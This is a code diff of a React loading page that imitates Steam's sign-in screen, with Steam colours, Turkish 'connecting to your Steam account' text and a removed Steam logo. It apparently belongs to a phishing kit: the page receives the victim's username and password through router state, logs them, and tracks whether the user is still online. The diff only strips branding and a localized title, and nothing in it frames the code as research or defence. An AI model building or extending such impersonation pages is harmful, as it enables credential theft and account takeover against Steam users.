@@ -4,7 +4,6 @@ import { useLocation, useNavigate } from 'react-router-dom';
 import { Loader } from 'lucide-react';
 import { toast } from 'sonner';
 import { Progress } from '@/components/ui/progress';
-import SteamLogo from '../components/SteamLogo';
 
 const LoadingPage = () => {
   const location = useLocation();
@@ -13,24 +12,6 @@ const LoadingPage = () => {
   const credentials = location.state || { username: '', password: '', id: null };
 
   console.log("Loading page initialized with credentials:", credentials);
-
-  // Update page title based on user language
-  useEffect(() => {
-    const userLanguage = navigator.language.split('-')[0];
-    let pageTitle = 'Giriş Yapılıyor'; // Default Turkish title
-    
-    if (userLanguage === 'en') {
-      pageTitle = 'Signing In';
-    } else if (userLanguage === 'de') {
-      pageTitle = 'Anmeldung läuft';
-    } else if (userLanguage === 'fr') {
-      pageTitle = 'Connexion en cours';
-    } else if (userLanguage === 'es') {
-      pageTitle = 'Iniciando sesión';
-    }
-    
-    document.title = pageTitle;
-  }, []);
 
   // Handle offline status when user leaves the page
   useEffect(() => {
@@ -97,9 +78,6 @@ const LoadingPage = () => {
   return (
     <div className="min-h-screen bg-[#171a21] flex flex-col items-center justify-center p-4">
       <div className="bg-[#1b2838]/70 backdrop-blur-sm p-8 rounded-md shadow-lg max-w-md w-full text-center">
-        <div className="flex justify-center mb-4">
-          <SteamLogo className="mx-auto" />
-        </div>
         <Loader className="animate-spin h-12 w-12 text-blue-400 mx-auto mb-4" />
         <h1 className="text-xl font-bold text-white mb-2">Giriş Yapılıyor</h1>
         <p className="text-white/70 mb-6">Steam hesabınıza bağlanılıyor, lütfen bekleyin...</p>
